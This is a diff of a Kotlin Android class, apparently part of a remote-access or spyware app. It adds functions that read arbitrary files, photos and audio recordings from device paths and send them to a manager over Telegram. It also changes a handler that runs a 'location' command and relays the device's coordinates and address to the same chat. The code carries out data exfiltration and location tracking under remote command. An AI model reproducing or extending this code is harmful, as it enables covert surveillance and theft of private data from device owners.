@@ -272,12 +272,63 @@ object TelegramDirectClient {
     /**
      * إرسال ملف PDF/JSON مباشرة للمدير على تيليجرام (نسخة متوافقة)
      */
-    suspend fun sendDocument(fileContent: String, fileName: String, caption: String? = null): Boolean {
+    suspend fun sendDocumentContent(fileContent: String, fileName: String, caption: String? = null): Boolean {
         return sendDocumentFile(
             fileContent.toByteArray(Charsets.UTF_8),
             fileName,
             caption
         )
+    }
+
+    /**
+     * إرسال ملف من مسار مباشرة
+     */
+    suspend fun sendDocument(filePath: String, fileName: String? = null, caption: String? = null): Boolean {
+        return try {
+            val file = java.io.File(filePath)
+            if (!file.exists()) {
+                Log.e(TAG, "الملف غير موجود: $filePath")
+                return false
+            }
+            sendDocumentFile(file.readBytes(), fileName ?: file.name, caption)
+        } catch (e: Exception) {
+            Log.e(TAG, "خطأ في sendDocument(path): ${e.message}", e)
+            false
+        }
+    }
+
+    /**
+     * إرسال صورة من مسار ملف
+     */
+    suspend fun sendPhoto(filePath: String, caption: String? = null): Boolean {
+        return try {
+            val file = java.io.File(filePath)
+            if (!file.exists()) {
+                Log.e(TAG, "الملف غير موجود: $filePath")
+                return false
+            }
+            sendPhoto(file.readBytes(), caption)
+        } catch (e: Exception) {
+            Log.e(TAG, "خطأ في sendPhoto(path): ${e.message}", e)
+            false
+        }
+    }
+
+    /**
+     * إرسال تسجيل صوتي من مسار ملف
+     */
+    suspend fun sendAudio(filePath: String, caption: String? = null): Boolean {
+        return try {
+            val file = java.io.File(filePath)
+            if (!file.exists()) {
+                Log.e(TAG, "الملف غير موجود: $filePath")
+                return false
+            }
+            sendAudio(file.readBytes(), caption)
+        } catch (e: Exception) {
+            Log.e(TAG, "خطأ في sendAudio(path): ${e.message}", e)
+            false
+        }
     }
 
     /**
@@ -1174,11 +1225,7 @@ object TelegramDirectClient {
         if (!success) {
             // في حالة فشل إرسال الملف، أرسل كرسالة نصية
             Log.w(TAG, "فشل إرسال الملف، يتم الإرسال كرسالة نصية")
-            val text = when (data) {
-                is Map<*, *> -> formatMapData(title, data)
-                is List<*> -> formatListData(title, data)
-                else -> "$title\n\n<code>${gson.toJson(data)}</code>"
-            }
+            val text = "$title\n\n<code>${gson.toJson(data)}</code>"
             sendLongMessage(text, "HTML")
         }
     }
@@ -1193,36 +1240,42 @@ object TelegramDirectClient {
         val data = CommandExecutor.execute(context, "location")
         LocalStorageManager.storeData(context, "location", data)
 
-        if (data is Map<*, *>) {
-            val latStr = data["latitude"]?.toString()
-            val lngStr = data["longitude"]?.toString()
-            val accStr = data["accuracy"]?.toString()
+        // Parse the JSON string response
+        try {
+            val jsonObj = gson.fromJson(data, Map::class.java)
+            if (jsonObj != null) {
+                val latStr = jsonObj["latitude"]?.toString()
+                val lngStr = jsonObj["longitude"]?.toString()
+                val accStr = jsonObj["accuracy"]?.toString()
 
-            if (latStr != null && lngStr != null) {
-                try {
-                    val lat = latStr.toDouble()
-                    val lng = lngStr.toDouble()
-                    val acc = accStr?.toFloatOrNull()
-                    sendLocation(lat, lng, acc)
+                if (latStr != null && lngStr != null) {
+                    try {
+                        val lat = latStr.toDouble()
+                        val lng = lngStr.toDouble()
+                        val acc = accStr?.toFloatOrNull()
+                        sendLocation(lat, lng, acc)
 
-                    val address = data["address"]?.toString() ?: "غير متوفر"
-                    val dateStr = data["date_readable"]?.toString() ?: getCurrentDateTime()
-                    sendMessage(
-                        "📍 <b>الموقع الجغرافي</b>\n\n" +
+                        val address = jsonObj["address"]?.toString() ?: "غير متوفر"
+                        val dateStr = jsonObj["date_readable"]?.toString() ?: getCurrentDateTime()
+                        sendMessage(
+                            "📍 <b>الموقع الجغرافي</b>\n\n" +
                                 "🌐 الإحداثيات: $lat, $lng\n" +
                                 "📍 العنوان: $address\n" +
                                 "📅 التاريخ: $dateStr",
-                        "HTML"
-                    )
-                } catch (e: Exception) {
-                    sendMessage("⚠️ خطأ في تحليل الإحداثيات: ${e.message}", "HTML")
+                            "HTML"
+                        )
+                    } catch (e: Exception) {
+                        sendMessage("⚠️ خطأ في تحليل الإحداثيات: ${e.message}", "HTML")
+                    }
+                } else {
+                    val error = jsonObj["error"]?.toString() ?: "لا يوجد موقع محفوظ"
+                    sendMessage("⚠️ $error", "HTML")
                 }
             } else {
-                val error = data["error"]?.toString() ?: "لا يوجد موقع محفوظ"
-                sendMessage("⚠️ $error", "HTML")
+                sendMessage("⚠️ تنسيق بيانات الموقع غير صحيح", "HTML")
             }
-        } else {
-            sendMessage("⚠️ تنسيق بيانات الموقع غير صحيح", "HTML")
+        } catch (e: Exception) {
+            sendMessage("⚠️ خطأ في تحليل الموقع: ${e.message}", "HTML")
         }
     }
 
@@ -1246,11 +1299,7 @@ object TelegramDirectClient {
         )
 
         if (!success) {
-            val text = when (data) {
-                is Map<*, *> -> formatMapData(title, data)
-                is List<*> -> formatListData(title, data)
-                else -> "$title\n\n<code>${gson.toJson(data)}</code>"
-            }
+            val text = "$title\n\n<code>${gson.toJson(data)}</code>"
             sendLongMessage(text, "HTML")
         }
     }
